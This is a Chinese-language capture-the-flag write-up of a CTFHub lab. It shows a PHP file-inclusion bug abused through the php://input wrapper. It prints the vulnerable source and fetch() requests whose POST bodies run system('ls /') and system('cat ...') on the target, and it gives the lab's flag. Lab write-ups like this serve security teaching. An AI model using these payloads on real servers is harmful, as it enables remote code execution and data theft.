---
title: CTFHub-RCE-php://input Writeup
date: 2026-10-24
category: web
tags: [CTFHub, RCE, 文件包含, 伪协议]
---

## 漏洞分析
### 1. 源码审计
访问靶机首页，页面给出的源码如下：
<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
<a href="phpinfo.php">phpinfo</a>
限制条件：substr($_GET["file"], 0, 6) === "php://"，要求 file 参数前 6 个字符必须是 php://。这意味着常规的文件包含（如直接包含 shell.txt）失效了。
提示信息：页面提示没有 shell，并给了一个 phpinfo.php 的链接。

### 2. 环境探测
访问 phpinfo.php，搜索 allow_url_include，确认其状态为 On。
这说明我们可以使用 php://input 伪协议，将 POST 请求体中的内容当作 PHP 代码执行。
## 解题步骤
### 第一步：构造伪协议包含
由于浏览器地址栏默认是 GET 请求，无法携带 POST 数据，因此需要使用浏览器开发者工具（Console）或 Burp Suite 来发送 POST 请求。
使用 F12 打开控制台，执行以下 JS 代码发包：
fetch('?file=php://input', {
    method: 'POST',
    body: '<?php system("ls /");?>'
})
.then(response => response.text())
.then(text => console.log(text));
### 第二步：获取目录信息
查看控制台回显，发现根目录 / 下有一个名为 flag_16420 的文件（而不是常规的 /flag）。
### 第三步：读取 Flag
修改 POST 请求体中的命令，读取该文件：
fetch('?file=php://input', {
    method: 'POST',
    body: '<?php system("cat /flag_16420");?>'
})
.then(response => response.text())
.then(text => console.log(text));
### 在控制台回显中成功获取到 Flag：ctfhub{38e746d3c3f319dc4468bbaf}。
